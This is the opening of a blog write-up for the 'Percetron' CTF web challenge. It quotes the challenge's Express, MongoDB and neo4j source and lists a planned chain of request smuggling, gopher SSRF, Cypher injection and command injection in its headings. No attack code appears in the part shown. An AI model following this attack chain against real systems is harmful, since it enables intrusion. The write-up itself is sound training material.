<!doctype html><html lang="en"><head><title>Percetron | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="HTB CA 2024. HA-Proxy. HTTP request smuggling. Server-Side Request Forgery. MongoDB Wire Protocol. Gopher Protocol. Cypher injection (neo4j). Command injection. RCE"><meta name="image" content="https://7rocky.github.io/images/web.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="HTB CA 2024. HA-Proxy. HTTP request smuggling. Server-Side Request Forgery. MongoDB Wire Protocol. Gopher Protocol. Cypher injection (neo4j). Command injection. RCE"><meta itemprop="keywords" content><meta itemprop="name" content="Percetron"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="HTB CA 2024. HA-Proxy. HTTP request smuggling. Server-Side Request Forgery. MongoDB Wire Protocol. Gopher Protocol. Cypher injection (neo4j). Command injection. RCE"><meta property="og:image" content="https://7rocky.github.io/images/web.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Percetron"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/percetron/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="HTB CA 2024. HA-Proxy. HTTP request smuggling. Server-Side Request Forgery. MongoDB Wire Protocol. Gopher Protocol. Cypher injection (neo4j). Command injection. RCE"><meta name="twitter:description" content="HTB CA 2024. HA-Proxy. HTTP request smuggling. Server-Side Request Forgery. MongoDB Wire Protocol. Gopher Protocol. Cypher injection (neo4j). Command injection. RCE"><meta name="twitter:image" content="https://7rocky.github.io/images/web.png"><meta name="twitter:title" content="Percetron"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/percetron/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/other/htb-cyber-apocalypse/percetron/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB CYBER APOCALYPSE</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/percetron/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/percetron/&amp;text=Percetron" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/percetron/&amp;title=Percetron" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Percetron</h1><p class="mb4 f6 dib tracked">14 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#source-code-analysis">Source code analysis</a></li><li><a href="#ssrf-exploitation">SSRF Exploitation</a><ul><li><a href="#mongodb-wire-protocol">MongoDB Wire Protocol</a></li><li><a href="#gopher-protocol">Gopher protocol</a></li><li><a href="#failed-attempts">Failed attempts</a></li><li><a href="#http-request-smuggling">HTTP request smuggling</a></li></ul></li><li><a href="#getting-rce">Getting RCE</a><ul><li><a href="#cypher-injection-neo4j">Cypher injection (neo4j)</a></li><li><a href="#command-injection">Command injection</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a website where we can register and log in to have this dashboard:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202024/Percetron-1.webp" alt="Percetron 1"></p><p>Moreover, we are given the whole web project for analysis.</p><h2 id="source-code-analysis">Source code analysis</h2><p>The web server is running Express JS (Node.js). The <code>index.js</code> file is quite standard, but we can see that it uses MongoDB and neo4j:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"dotenv"</span><span class="mtk1">).</span><span class="mtk8">config</span><span class="mtk1">();</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">path</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"path"</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">express</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"express"</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">session</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"express-session"</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> mongoose </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"mongoose"</span><span class="mtk1">);</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8 mtku">Neo4jConnection</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"./util/neo4j"</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8 mtku">MongoDBConnection</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"./util/mongo"</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> { migrate } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"./util/generic"</span><span class="mtk1">);</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">genericRoutes</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"./routes/generic"</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">panelRoutes</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"./routes/panel"</span><span class="mtk1">);</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">application</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">express</span><span class="mtk1">();</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">neo4j</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Neo4jConnection</span><span class="mtk1">();</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">mongodb</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">MongoDBConnection</span><span class="mtk1">();</span>

<span class="mtk1">application</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk4">"/static"</span><span class="mtk1">, </span><span class="mtk8">express</span><span class="mtk1">.</span><span class="mtk8">static</span><span class="mtk1">(</span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">join</span><span class="mtk1">(</span><span class="mtk1">__dirname</span><span class="mtk1">, </span><span class="mtk4">"static"</span><span class="mtk1">)));</span>  

<span class="mtk1">application</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk8">express</span><span class="mtk1">.</span><span class="mtk8">urlencoded</span><span class="mtk1">({ </span><span class="mtk1">extended</span><span class="mtk1">: </span><span class="mtk6">true</span><span class="mtk1"> }));</span>
<span class="mtk1">application</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk8">express</span><span class="mtk1">.</span><span class="mtk8">json</span><span class="mtk1">());</span>

<span class="mtk1">application</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span>
<span class="mtk1">    </span><span class="mtk8">session</span><span class="mtk1">({</span>
<span class="mtk1">        </span><span class="mtk1">secret</span><span class="mtk1">: </span><span class="mtk1">process</span><span class="mtk1">.</span><span class="mtk1">env</span><span class="mtk1">.SESSION_SECRET,</span>
<span class="mtk1">        </span><span class="mtk1">resave</span><span class="mtk1">: </span><span class="mtk6">true</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk1">saveUninitialized</span><span class="mtk1">: </span><span class="mtk6">true</span><span class="mtk1">,</span>
<span class="mtk1">    })</span>
<span class="mtk1">);</span>

<span class="mtk1">application</span><span class="mtk1">.</span><span class="mtk8">set</span><span class="mtk1">(</span><span class="mtk4">"view engine"</span><span class="mtk1">, </span><span class="mtk4">"pug"</span><span class="mtk1">);</span>

<span class="mtk1">application</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk1">genericRoutes</span><span class="mtk1">);</span>
<span class="mtk1">application</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk1">panelRoutes</span><span class="mtk1">);</span>

<span class="mtk7">setTimeout</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> () </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> mongoose.</span><span class="mtk8">connect</span><span class="mtk1">(</span><span class="mtk1">process</span><span class="mtk1">.</span><span class="mtk1">env</span><span class="mtk1">.MONGODB_URL);</span>
<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk8">migrate</span><span class="mtk1">(</span><span class="mtk1">neo4j</span><span class="mtk1">, </span><span class="mtk1">mongodb</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">application</span><span class="mtk1">.</span><span class="mtk8">listen</span><span class="mtk1">(</span><span class="mtk6">3000</span><span class="mtk1">, </span><span class="mtk4">"0.0.0.0"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk4">"Listening on port 3000"</span><span class="mtk1">);</span>
<span class="mtk1">}, </span><span class="mtk6">10000</span><span class="mtk1">);</span>
</code></pre></div><p>MongoDB is used for user authentication and authorization, using <code>mongoose</code>. This is the only model we have:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> mongoose </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"mongoose"</span><span class="mtk1">);</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">userSchema</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> mongoose.</span><span class="mtk8">Schema</span><span class="mtk1">({</span>
<span class="mtk1">    </span><span class="mtk1">username</span><span class="mtk1">: { </span><span class="mtk8 mtku">type</span><span class="mtk1">: </span><span class="mtk7 mtki">String</span><span class="mtk1">, </span><span class="mtk1">unique</span><span class="mtk1">: </span><span class="mtk6">true</span><span class="mtk1"> },</span>
<span class="mtk1">    </span><span class="mtk8 mtku">password</span><span class="mtk1">: </span><span class="mtk7 mtki">String</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk8 mtku">permission</span><span class="mtk1">: </span><span class="mtk7 mtki">String</span><span class="mtk1">,</span>
<span class="mtk1">});</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">Users</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> mongoose.</span><span class="mtk8">model</span><span class="mtk1">(</span><span class="mtk4">"Users"</span><span class="mtk1">, </span><span class="mtk1">userSchema</span><span class="mtk1">);</span>  

<span class="mtk1">module</span><span class="mtk1">.</span><span class="mtk1">exports</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">Users</span><span class="mtk1">;</span>
</code></pre></div><p>There are only two endpoints that interact directly with MongoDB (<code>challenge/routes/panel.js</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk4">"/panel/register"</span><span class="mtk1">, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">username</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">body</span><span class="mtk1">.username;</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">password</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">body</span><span class="mtk1">.password;</span>

<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">MongoDBConnection</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">(</span><span class="mtk1">username</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">password</span><span class="mtk1">)) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">"error"</span><span class="mtk1">, {</span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"Missing parameters"</span><span class="mtk1">});</span>  
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">(</span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">registerUser</span><span class="mtk1">(</span><span class="mtk1">username</span><span class="mtk1">, </span><span class="mtk1">password</span><span class="mtk1">, </span><span class="mtk4">"user"</span><span class="mtk1">)))</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">"error"</span><span class="mtk1">, {</span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"Could not register user"</span><span class="mtk1">});</span>

<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">"/panel/login"</span><span class="mtk1">);</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk4">"/panel/login"</span><span class="mtk1">, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">username</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">body</span><span class="mtk1">.username;</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">password</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">body</span><span class="mtk1">.password;</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">(</span><span class="mtk1">username</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">password</span><span class="mtk1">)) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">"error"</span><span class="mtk1">, {</span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"Missing parameters"</span><span class="mtk1">});</span>

<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">MongoDBConnection</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">(</span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">validateUser</span><span class="mtk1">(</span><span class="mtk1">username</span><span class="mtk1">, </span><span class="mtk1">password</span><span class="mtk1">)))</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">"error"</span><span class="mtk1">, {</span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"Invalid user or password"</span><span class="mtk1">});</span>

<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">userData</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">getUserData</span><span class="mtk1">(</span><span class="mtk1">username</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">session</span><span class="mtk1">.loggedin </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">session</span><span class="mtk1">.username </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">username</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">session</span><span class="mtk1">.permission </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">userData</span><span class="mtk1">.permission;</span>

<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">"/panel"</span><span class="mtk1">);</span>
<span class="mtk1">});</span>
